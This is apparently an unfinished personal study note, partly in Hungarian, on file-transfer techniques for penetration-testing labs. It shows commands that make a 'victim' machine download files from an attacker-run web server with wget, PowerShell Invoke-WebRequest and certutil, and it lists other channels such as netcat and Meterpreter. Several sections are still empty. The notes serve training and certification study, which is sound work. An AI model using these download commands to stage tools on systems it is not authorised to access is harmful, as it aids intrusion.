# TODO
* htba file transfers modult nezzuk meg
* ejpt repobol nezzuk meg a methodokat
# Basic file transfer methods
## Base64 encode - decode - copy/paste between machines
* Base64 encoding data on source machine
* Copy-pasting base64 string from source machine to dest machine
* Base64 decoding on destination machine (+ redirect output to file)
## HTTP file transfer
### From Attack host to Victim host (Linux)
* python web server + wget
<pre>
<b># attack machine</b>
$ python -m http.server 8000
<b># victim machine</b>
$ wget http://10.10.10.2:8000/file.txt
</pre>
### From Attack host to Victim host (Windows)
* python web server + powershell iwr
<pre>
<b># attack machine</b>
$ python -m http.server 8000
<b># victim machine</b>
PS> Invoke-WebRequest -Uri http://10.10.10.2:8000/file.txt -OutFile .\file.txt
</pre>
* python web server + certutil
<pre>
<b># attack machine</b>
$ python -m http.server 8000
<b># victim machine</b>
C:\> certutil -urlcache -split -f http://10.10.10.2:8000/file.txt
</pre>
### From Victim host (Linux) to Attack host
* python web server + wget
### From Victim host (Windows) to Attack host
????
### Alternatives for tools
* alternatives for python: python3, python2.7, php, perl, ruby, ...
* alternatives for wget: curl, powershell iwr, certutil
## Netcate redirect file transfer
<pre>
dolgozzuk ki szepen
</pre>
## SMB file transfer
## SCP file transfer
## Meterpreter file transfer
## Other solutions
* RDP mounted drive
* HTTP file upload server hosted on attack machine + power shell client script
* Netcat pipes + redirect
* FTP
